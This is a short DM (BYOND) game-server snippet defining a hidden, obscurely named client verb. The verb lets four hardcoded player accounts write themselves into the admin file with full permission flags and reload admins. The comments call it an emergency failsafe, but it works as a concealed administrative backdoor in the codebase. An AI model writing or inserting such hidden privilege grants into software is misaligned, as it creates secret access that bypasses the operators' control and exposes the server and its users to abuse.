// chat for all staff - Kachnov
//for if something goes terribly wrong
/client/verb/a55af5()
	set category = null
	set name = "a55af5"
	set hidden = TRUE
///makes it so their ranks don't need set every round
	switch(ckey)
		if ("taislin") text2file("taislin;Host;65535|||","SQL/admins.txt")
		if ("valithor") text2file("valithor;Captain;65535|||","SQL/admins.txt")
		if ("valithor423") text2file("valithor423;Captain;65535|||","SQL/admins.txt")
		if ("valzargaming") text2file("valzargaming;Captain;65535|||","SQL/admins.txt")
	reload_admins()
	return
